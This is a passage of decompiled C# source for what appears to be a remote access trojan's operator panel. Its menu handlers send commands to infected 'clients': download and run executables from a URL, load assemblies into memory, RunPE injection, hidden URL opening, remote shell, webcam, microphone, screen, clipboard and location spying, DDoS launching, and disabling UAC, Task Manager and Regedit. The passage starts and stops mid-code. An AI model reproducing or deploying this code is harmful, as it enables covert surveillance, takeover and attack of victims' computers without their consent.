			closure_0024__R802_002D = new _Closure_0024__R802_002D12(closure_0024__R802_002D);
			closure_0024__R802_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R802_002D._Lambda_0024__R14, array);
		}
	}

	private void UpdateToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		OpenFileDialog openFileDialog = new OpenFileDialog();
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("update" + GClass19.string_0 + Path.GetExtension(openFileDialog.FileName) + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(File.ReadAllBytes(openFileDialog.FileName))));
			_Closure_0024__R803_002D14 closure_0024__R803_002D = default(_Closure_0024__R803_002D14);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R803_002D = new _Closure_0024__R803_002D14(closure_0024__R803_002D);
				closure_0024__R803_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R803_002D._Lambda_0024__R16, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void NoteToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		string text = Interaction.InputBox("Enter Your Note", "Note");
		try
		{
			foreach (ListViewItem selectedItem in Lv1.SelectedItems)
			{
				Module0.smethod_5(selectedItem.SubItems[2].Text, text);
				if (string.IsNullOrEmpty(text))
				{
					selectedItem.SubItems[14].Text = "Null";
				}
				else
				{
					selectedItem.SubItems[14].Text = text;
				}
			}
			Lv1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			_ActiveWindow.Width = 500;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void VisibleToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		object obj = Interaction.InputBox("Enter Your Url", "Open Visible Url", "http://exmple.com");
		if (string.IsNullOrWhiteSpace(Conversions.ToString(obj)))
		{
			return;
		}
		byte[] array = Module0.smethod_6(Conversions.ToString(Operators.ConcatenateObject("Urlopen" + GClass19.string_0, obj)));
		_Closure_0024__R805_002D16 closure_0024__R805_002D = default(_Closure_0024__R805_002D16);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R805_002D = new _Closure_0024__R805_002D16(closure_0024__R805_002D);
			closure_0024__R805_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R805_002D._Lambda_0024__R18, array);
		}
	}

	private void InvisibleToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		object obj = Interaction.InputBox("Enter Your Url", "Open Invisible Url", "http://exmple.com");
		if (string.IsNullOrWhiteSpace(Conversions.ToString(obj)))
		{
			return;
		}
		byte[] array = Module0.smethod_6(Conversions.ToString(Operators.ConcatenateObject("Urlhide" + GClass19.string_0, obj)));
		_Closure_0024__R806_002D18 closure_0024__R806_002D = default(_Closure_0024__R806_002D18);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R806_002D = new _Closure_0024__R806_002D18(closure_0024__R806_002D);
			closure_0024__R806_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R806_002D._Lambda_0024__R20, array);
		}
	}

	private void ShutdownToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		byte[] array = Module0.smethod_6("PCShutdown");
		_Closure_0024__R807_002D20 closure_0024__R807_002D = default(_Closure_0024__R807_002D20);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R807_002D = new _Closure_0024__R807_002D20(closure_0024__R807_002D);
			closure_0024__R807_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R807_002D._Lambda_0024__R22, array);
		}
	}

	private void RestartToolStripMenuItem4_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		byte[] array = Module0.smethod_6("PCRestart");
		_Closure_0024__R808_002D22 closure_0024__R808_002D = default(_Closure_0024__R808_002D22);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R808_002D = new _Closure_0024__R808_002D22(closure_0024__R808_002D);
			closure_0024__R808_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R808_002D._Lambda_0024__R24, array);
		}
	}

	private void LogoffToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		byte[] array = Module0.smethod_6("PCLogoff");
		_Closure_0024__R809_002D24 closure_0024__R809_002D = default(_Closure_0024__R809_002D24);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R809_002D = new _Closure_0024__R809_002D24(closure_0024__R809_002D);
			closure_0024__R809_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R809_002D._Lambda_0024__R26, array);
		}
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_810_DiskToolStripMenuItem_Click))]
	[DebuggerStepThrough]
	private void DiskToolStripMenuItem_Click(object sender, EventArgs e)
	{
		VB_0024StateMachine_810_DiskToolStripMenuItem_Click stateMachine = new VB_0024StateMachine_810_DiskToolStripMenuItem_Click();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024VB_0024Local_sender = sender;
		stateMachine._0024VB_0024Local_e = e;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	private void LinkToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		string defaultResponse = "http://www.example.com/File.exe";
		string text = Interaction.InputBox("Url", "From Url", defaultResponse);
		string text2 = Interaction.InputBox("Extension", "From Url", ".exe");
		if ((text.Length == 0) | (text2.Length == 0))
		{
			return;
		}
		byte[] array = Module0.smethod_6("LN" + GClass19.string_0 + text2 + GClass19.string_0 + text);
		_Closure_0024__R811_002D28 closure_0024__R811_002D = default(_Closure_0024__R811_002D28);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R811_002D = new _Closure_0024__R811_002D28(closure_0024__R811_002D);
			closure_0024__R811_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R811_002D._Lambda_0024__R30, array);
		}
	}

	private void MemoryToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			OpenFileDialog openFileDialog2 = openFileDialog;
			openFileDialog2.Filter = "(*.exe)|*.exe";
			openFileDialog2.Title = "From Memory";
			openFileDialog2 = null;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			try
			{
				Assembly.LoadFile(openFileDialog.FileName).EntryPoint.GetParameters();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				MessageBox.Show(openFileDialog.FileName, "Is Not A .NET Assembly");
				ProjectData.ClearProjectError();
				return;
			}
			byte[] array = Module0.smethod_6("FM" + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(File.ReadAllBytes(openFileDialog.FileName))));
			_Closure_0024__R812_002D30 closure_0024__R812_002D = default(_Closure_0024__R812_002D30);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R812_002D = new _Closure_0024__R812_002D30(closure_0024__R812_002D);
				closure_0024__R812_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R812_002D._Lambda_0024__R32, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void RunPEToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count > 0)
		{
			RunPE runPE = new RunPE();
			runPE.StartPosition = FormStartPosition.CenterParent;
			runPE.ShowDialog();
		}
	}

	private void MonitorToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\RemoteDesktop.dll"));
			_Closure_0024__R814_002D32 closure_0024__R814_002D = default(_Closure_0024__R814_002D32);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R814_002D = new _Closure_0024__R814_002D32(closure_0024__R814_002D);
				closure_0024__R814_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R814_002D._Lambda_0024__R34, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void WebCamToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\WebCam.dll"));
			_Closure_0024__R815_002D34 closure_0024__R815_002D = default(_Closure_0024__R815_002D34);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R815_002D = new _Closure_0024__R815_002D34(closure_0024__R815_002D);
				closure_0024__R815_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R815_002D._Lambda_0024__R36, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void MicrophoneToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Microphone.dll"));
			_Closure_0024__R816_002D36 closure_0024__R816_002D = default(_Closure_0024__R816_002D36);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R816_002D = new _Closure_0024__R816_002D36(closure_0024__R816_002D);
				closure_0024__R816_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R816_002D._Lambda_0024__R38, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void SystemSoundToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\WSound.dll"));
			_Closure_0024__R817_002D38 closure_0024__R817_002D = default(_Closure_0024__R817_002D38);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R817_002D = new _Closure_0024__R817_002D38(closure_0024__R817_002D);
				closure_0024__R817_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R817_002D._Lambda_0024__R40, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ShellToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Shell.dll"));
			_Closure_0024__R818_002D40 closure_0024__R818_002D = default(_Closure_0024__R818_002D40);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R818_002D = new _Closure_0024__R818_002D40(closure_0024__R818_002D);
				closure_0024__R818_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R818_002D._Lambda_0024__R42, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\FileManager.dll"));
			_Closure_0024__R819_002D42 closure_0024__R819_002D = default(_Closure_0024__R819_002D42);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R819_002D = new _Closure_0024__R819_002D42(closure_0024__R819_002D);
				closure_0024__R819_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R819_002D._Lambda_0024__R44, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void RegistryEditorToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Regedit.dll"));
			_Closure_0024__R820_002D44 closure_0024__R820_002D = default(_Closure_0024__R820_002D44);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R820_002D = new _Closure_0024__R820_002D44(closure_0024__R820_002D);
				closure_0024__R820_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R820_002D._Lambda_0024__R46, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void TCPConnectionsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\TCPConnections.dll"));
			_Closure_0024__R821_002D46 closure_0024__R821_002D = default(_Closure_0024__R821_002D46);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R821_002D = new _Closure_0024__R821_002D46(closure_0024__R821_002D);
				closure_0024__R821_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R821_002D._Lambda_0024__R48, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ActiveWindowsToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\ActiveWindows.dll"));
			_Closure_0024__R822_002D48 closure_0024__R822_002D = default(_Closure_0024__R822_002D48);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R822_002D = new _Closure_0024__R822_002D48(closure_0024__R822_002D);
				closure_0024__R822_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R822_002D._Lambda_0024__R50, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void StartupManagerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\StartupManager.dll"));
			_Closure_0024__R823_002D50 closure_0024__R823_002D = default(_Closure_0024__R823_002D50);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R823_002D = new _Closure_0024__R823_002D50(closure_0024__R823_002D);
				closure_0024__R823_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R823_002D._Lambda_0024__R52, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ProcessManagerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\ProcessManager.dll"));
			_Closure_0024__R824_002D52 closure_0024__R824_002D = default(_Closure_0024__R824_002D52);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R824_002D = new _Closure_0024__R824_002D52(closure_0024__R824_002D);
				closure_0024__R824_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R824_002D._Lambda_0024__R54, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ServiceManagerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\ServiceManager.dll"));
			_Closure_0024__R825_002D54 closure_0024__R825_002D = default(_Closure_0024__R825_002D54);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R825_002D = new _Closure_0024__R825_002D54(closure_0024__R825_002D);
				closure_0024__R825_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R825_002D._Lambda_0024__R56, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ClipboardManagerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Clipboard.dll"));
			_Closure_0024__R826_002D56 closure_0024__R826_002D = default(_Closure_0024__R826_002D56);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R826_002D = new _Closure_0024__R826_002D56(closure_0024__R826_002D);
				closure_0024__R826_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R826_002D._Lambda_0024__R58, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void InstalledProgramsToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Programs.dll"));
			_Closure_0024__R827_002D58 closure_0024__R827_002D = default(_Closure_0024__R827_002D58);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R827_002D = new _Closure_0024__R827_002D58(closure_0024__R827_002D);
				closure_0024__R827_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R827_002D._Lambda_0024__R60, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void DDosAttackToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		MyProject.Forms.DDosAttack.Show();
		byte[] array = Module0.smethod_6("DDos");
		_Closure_0024__R828_002D60 closure_0024__R828_002D = default(_Closure_0024__R828_002D60);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R828_002D = new _Closure_0024__R828_002D60(closure_0024__R828_002D);
			closure_0024__R828_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R828_002D._Lambda_0024__R62, array);
		}
	}

	private void VBNetCompilerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\VB.NET Compiler.dll"));
			_Closure_0024__R829_002D62 closure_0024__R829_002D = default(_Closure_0024__R829_002D62);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R829_002D = new _Closure_0024__R829_002D62(closure_0024__R829_002D);
				closure_0024__R829_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R829_002D._Lambda_0024__R64, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void LocationManagerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Maps.dll"));
			_Closure_0024__R830_002D64 closure_0024__R830_002D = default(_Closure_0024__R830_002D64);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R830_002D = new _Closure_0024__R830_002D64(closure_0024__R830_002D);
				closure_0024__R830_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R830_002D._Lambda_0024__R66, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void PastimeToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Pastime.dll"));
			_Closure_0024__R831_002D66 closure_0024__R831_002D = default(_Closure_0024__R831_002D66);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R831_002D = new _Closure_0024__R831_002D66(closure_0024__R831_002D);
				closure_0024__R831_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R831_002D._Lambda_0024__R68, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			string text = Path.Combine(Application.StartupPath, "ClientsFolder", Lv1.SelectedItems[0].SubItems[2].Text);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Process.Start(text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void EnableToolStripMenuItem6_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "BScreenE");
			_Closure_0024__R833_002D68 closure_0024__R833_002D = default(_Closure_0024__R833_002D68);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R833_002D = new _Closure_0024__R833_002D68(closure_0024__R833_002D);
				closure_0024__R833_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R833_002D._Lambda_0024__R70, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void DisableToolStripMenuItem6_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "BScreenD");
			_Closure_0024__R834_002D70 closure_0024__R834_002D = default(_Closure_0024__R834_002D70);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R834_002D = new _Closure_0024__R834_002D70(closure_0024__R834_002D);
				closure_0024__R834_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R834_002D._Lambda_0024__R72, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void EnableToolStripMenuItem7_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "UACE");
			_Closure_0024__R835_002D72 closure_0024__R835_002D = default(_Closure_0024__R835_002D72);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R835_002D = new _Closure_0024__R835_002D72(closure_0024__R835_002D);
				closure_0024__R835_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R835_002D._Lambda_0024__R74, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void DisableToolStripMenuItem7_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "UACD");
			_Closure_0024__R836_002D74 closure_0024__R836_002D = default(_Closure_0024__R836_002D74);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R836_002D = new _Closure_0024__R836_002D74(closure_0024__R836_002D);
				closure_0024__R836_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R836_002D._Lambda_0024__R76, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void EnableToolStripMenuItem8_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "RegeditE");
			_Closure_0024__R837_002D76 closure_0024__R837_002D = default(_Closure_0024__R837_002D76);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R837_002D = new _Closure_0024__R837_002D76(closure_0024__R837_002D);
				closure_0024__R837_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R837_002D._Lambda_0024__R78, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void DisableToolStripMenuItem8_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "RegeditD");
			_Closure_0024__R838_002D78 closure_0024__R838_002D = default(_Closure_0024__R838_002D78);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R838_002D = new _Closure_0024__R838_002D78(closure_0024__R838_002D);
				closure_0024__R838_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R838_002D._Lambda_0024__R80, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void EnableToolStripMenuItem9_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "TaskMgrE");
			_Closure_0024__R839_002D80 closure_0024__R839_002D = default(_Closure_0024__R839_002D80);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R839_002D = new _Closure_0024__R839_002D80(closure_0024__R839_002D);
				closure_0024__R839_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R839_002D._Lambda_0024__R82, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void DisableToolStripMenuItem9_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Options.dll") + GClass19.string_0 + "TaskMgrD");
			_Closure_0024__R840_002D82 closure_0024__R840_002D = default(_Closure_0024__R840_002D82);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R840_002D = new _Closure_0024__R840_002D82(closure_0024__R840_002D);
				closure_0024__R840_002D._0024VB_0024NonLocal_2 = item;
